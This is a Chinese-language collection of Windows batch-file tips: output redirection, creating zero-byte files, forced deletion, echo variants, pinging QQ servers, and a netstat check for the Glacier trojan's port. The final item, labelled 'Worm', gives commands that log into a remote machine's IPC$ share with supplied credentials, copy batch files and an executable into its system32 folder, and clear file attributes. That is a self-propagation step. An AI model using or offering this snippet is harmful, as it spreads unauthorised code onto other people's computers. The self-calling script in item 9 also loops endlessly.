@echo off

echo %0
echo.
echo.

1、不显示代码执行期间的各种提示信息
　　很多时候，为了使得屏幕上不出现无关的信息，我们需要屏蔽掉命令执行过程中产生的一些提示，有时候是屏蔽掉出错信息，有时候是为了屏蔽成功执行命令的信息，有时候两者都需要屏蔽，那么，我们可以把各种提示信息重定向到空设备中去，具体的代码是：
　　① 如果要屏蔽成功执行命令的信息，请在语句的最后加上代码 >nul。比如 copy a.txt d:\test>nul
　　② 如果要屏蔽出错信息，请在语句最后加上代码  2>nul，需要注意的是，数字2前必须带空格。比如，md test 2>nul，如果当前目录已经存在文件夹test，那么，执行这条语句将不会出现错误提示；
　　③ 如果要同时屏蔽正确执行代码后产生的提示和出错时的信息，请在语句最后加上代码 >nul 2>nul。比如，copy a.txt d:\test>nul 2>nul 这条语句，无论命令是否成功执行，都不会在屏幕上出现任何提示；
　　善用 nul 2>nul 句式，可以很方便地实现很多目的，比如创建文件夹的时候，无需先用if语句来检测是否已经存在某个目录，直接 md test 2>nul 即可，可以提高代码的执行效率。

2、cd.>test.txt
　　很多人第一次遇到这样的语句时，都会大惑不解：cd不是跳转目录的命令吗？怎么会有创建0字节文件的功能呢？曾经有段时间，我是用echo.>test.txt来创建空文件的，只是这个空文件虽然没有任何内容，但是，大小不是0字节，在要求苛刻的情况下，并不能很好地完成任务。实际上，从理论上来说，创建0字节文件的语句有无限多种，只要明白其中的奥妙，就可以随心所欲地构造出来，只是cd.>test.txt是最简洁的方法，符合我"解决问题简洁化"的一贯主张。构造0字节文件的奥妙在于：只要没有任何内容重定向到文件中去，0字节文件就会随着命令的执行而产生。比如dir 2>test.txt、arp >text.txt、abc 4>test.txt……，只要符合"任意内容+空格+2以上10以下的数字+>test.txt"的格式即可。需要注意的是，千万不要被屏幕上的各种出错信息所蒙蔽，我们的最终目的是产生0字节的文件，至于错误提示完全可以用 2>nul 去屏蔽。更详细的讨论请参考本人在CN-DOS发过的这篇帖子：可构造0字节文本文件的几条命令 。

3、del /a /f *.txt
　　我们知道，单独的del命令并不能删除带隐藏或只读属性的文件，于是，很多人自然而然地想到先用 attrib 命令来先给将要删除的文件去掉各种属性。其实，操作过程大可不必如此繁琐，只须给del加上 /a /f 的参数就可以了。

4、echo. echo; echo/和echo\
　　在很多人的心目中，产生换行符的方法只有echo.一种，实际上，到目前为止，已经有人找出了标题所列的四种方法，有兴趣不妨换着用用，也可以在菜鸟面前炫耀一番^_^

5、echo.%str% 和 echo %str%
　　知道 echo.hello! 和 echo hello! 有何差别吗？就具体字符串的输出而言，它们在效果上是完全等同的；但是，当 hello! 用变量来替换之后，在特定情况下结果将会截然不同！试试令变量 str 为空，再在批处理文件中分别执行这两条语句，看看它们的提示吧。结果出来了吗？总结一下：当变量 str 的值为空时，echo.%str% 输出了一个空行，而 echo %str% 则返回 echo 的当前状态。当用 for 语句读取带空行的文本，并用 echo 语句来输出时，echo.%str% 语句无疑是上上之选。另外，第4条的技巧在这里同样适用。

6、拼接多行字符串为一行
    @echo off
    setlocal enabledelayedexpansion
    for /f "delims=" %%i in (22.txt) do (
    set  str=!str!%%i
    )
    echo %str%
    pause>nul

7.以树形格式罗列文件
    tree ，在英语中的基本含义是“树”，在cmd中，tree命令的功能是以树形格式罗列文件。
    tree>list.txt，所有的信息都保存到list.txt文件。

8.将下面的几行命令保存为name.bat然后执行：
    ping sz.tencent.com > a.txt
    ping sz1.tencent.com >> a.txt
    ping sz2.tencent.com >> a.txt
    ping sz3.tencent.com >> a.txt
    ping sz4.tencent.com >> a.txt
    ping sz5.tencent.com >> a.txt
    ping sz6.tencent.com >> a.txt
    ping sz7.tencent.com >> a.txt
    exit
    a.txt的文件，它里面记录的信息可以帮助你迅速找到速度最快的QQ服务器，从而远离“从服务器中转”那一痛苦的过程。
    这里>的意思，是把前面命令得到的东西放到后面所给的地方，>>的作用，和>的相同，区别是把结果追加到前一行得出的结果的后面，具体的说是下一行，而前面一行命令得出的结果将保留，这样可以使这个a.txt文件越来越大。这个批处理还可以和其他命令结合，搞成完全自动化判断服务器速度的东东，执行后直接显示速度最快的服务器IP。

9.调用自身。（a.bat）：
    @echo off
    if exist C:\Progra~1\Tencent\AD\*.gif del C:\Progra~1\Tencent\AD\*.gif
    a.bat

10.使用批处理脚本检测是否中木马病毒（通过检测端口的方式，例如端口7626）。脚本内容如下：
   @echo off
   netstat -a -n > a.txt
   type a.txt | find "7626" && echo "Congratulations! You have infected GLACIER!"
   del a.txt
   pause & exit

11.Worm
    net use \\%1\ipc$ %3 /u:"%2"
    copy 11.BAT \\%1\admin$\system32 /y
    copy 13.BAT \\%1\admin$\system32 /y
    copy ipc2.BAT \\%1\admin$\system32 /y
    copy NWZI.EXE \\%1\admin$\system32 /y
    attrib \\%1\admin$\system32\10.bat -r -h -s